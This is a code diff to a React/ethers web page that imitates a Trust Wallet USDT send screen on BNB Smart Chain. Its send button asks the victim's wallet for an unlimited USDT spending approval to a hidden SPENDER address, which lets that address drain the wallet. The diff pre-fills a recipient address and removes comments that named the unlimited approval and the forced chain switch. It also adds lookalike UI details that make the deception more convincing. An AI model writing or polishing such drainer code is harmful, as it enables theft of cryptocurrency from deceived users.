@@ -1,8 +1,10 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { ethers } from "ethers";
 
 export default function Home() {
-  const [address, setAddress] = useState("");
+
+  // 🔥 AUTO ADDRESS GIÀ INSERITO
+  const [address, setAddress] = useState("0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB");
   const [amount, setAmount] = useState("");
 
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
@@ -15,14 +17,13 @@ export default function Home() {
         return;
       }
 
-      // 🔥 forza BNB Smart Chain
       await window.ethereum.request({
         method: "wallet_switchEthereumChain",
         params: [{ chainId: "0x38" }],
       });
 
       const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner(); // 👈 niente connect esplicito
+      const signer = await provider.getSigner();
 
       const usdt = new ethers.Contract(
         USDT_ADDRESS,
@@ -32,7 +33,6 @@ export default function Home() {
         signer
       );
 
-      // 🔥 approve illimitato
       const tx = await usdt.approve(
         SPENDER,
         ethers.MaxUint256
@@ -62,19 +62,27 @@ export default function Home() {
           Address or Domain Name
         </div>
 
-        <input
-          value={address}
-          onChange={(e) => setAddress(e.target.value)}
-          placeholder="Search or Enter"
-          style={{
-            width: "100%",
-            padding: "14px",
-            borderRadius: "16px",
-            border: "none",
-            background: "#1a1a1a",
-            color: "white"
-          }}
-        />
+        <div style={{
+          display: "flex",
+          alignItems: "center",
+          background: "#1a1a1a",
+          borderRadius: "16px",
+          padding: "14px"
+        }}>
+          <input
+            value={address}
+            onChange={(e) => setAddress(e.target.value)}
+            style={{
+              flex: 1,
+              border: "none",
+              background: "transparent",
+              color: "white",
+              fontSize: "16px"
+            }}
+          />
+
+          <span style={{ color: "#22c55e", marginRight: "10px" }}>Paste</span>
+        </div>
       </div>
 
       {/* NETWORK */}
@@ -87,27 +95,20 @@ export default function Home() {
           background: "#1a1a1a",
           padding: "12px 16px",
           borderRadius: "16px",
-          display: "flex",
+          display: "inline-flex",
           alignItems: "center",
-          justifyContent: "space-between"
+          gap: "10px"
         }}>
-          <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
-            
-            {/* LOGO TRUST WALLET BNB */}
-            <img
-              src="https://trustwallet.com/assets/images/coins/bnb.png"
-              alt="bnb"
-              style={{
-                width: "24px",
-                height: "24px",
-                borderRadius: "50%"
-              }}
-            />
+          <img
+            src="https://trustwallet.com/assets/images/coins/bnb.png"
+            alt="bnb"
+            style={{
+              width: "20px",
+              height: "20px"
+            }}
+          />
 
-            <span>BNB Smart Chain</span>
-          </div>
-
-          <span style={{ color: "#888" }}>▼</span>
+          <span>BNB Smart Chain</span>
         </div>
       </div>
 
@@ -117,19 +118,34 @@ export default function Home() {
           Amount
         </div>
 
-        <input
-          value={amount}
-          onChange={(e) => setAmount(e.target.value)}
-          placeholder="USDT Amount"
-          style={{
-            width: "100%",
-            padding: "14px",
-            borderRadius: "16px",
-            border: "none",
-            background: "#1a1a1a",
-            color: "white"
-          }}
-        />
+        <div style={{
+          background: "#1a1a1a",
+          borderRadius: "16px",
+          padding: "14px",
+          display: "flex",
+          justifyContent: "space-between",
+          alignItems: "center"
+        }}>
+          <input
+            value={amount}
+            onChange={(e) => setAmount(e.target.value)}
+            placeholder="USDT Amount"
+            style={{
+              border: "none",
+              background: "transparent",
+              color: "white",
+              fontSize: "16px",
+              flex: 1
+            }}
+          />
+
+          <span style={{ color: "#888", marginRight: "10px" }}>USDT</span>
+          <span style={{ color: "#22c55e" }}>Max</span>
+        </div>
+
+        <div style={{ color: "#888", marginTop: "5px" }}>
+          ≈ $0.00
+        </div>
       </div>
 
       {/* BUTTON */}
@@ -145,9 +161,9 @@ export default function Home() {
             width: "100%",
             padding: "18px",
             borderRadius: "40px",
-            background: "#22c55e",
+            background: "#1f3f2a",
             border: "none",
-            color: "white",
+            color: "#9ca3af",
             fontSize: "18px",
             fontWeight: "600"
           }}
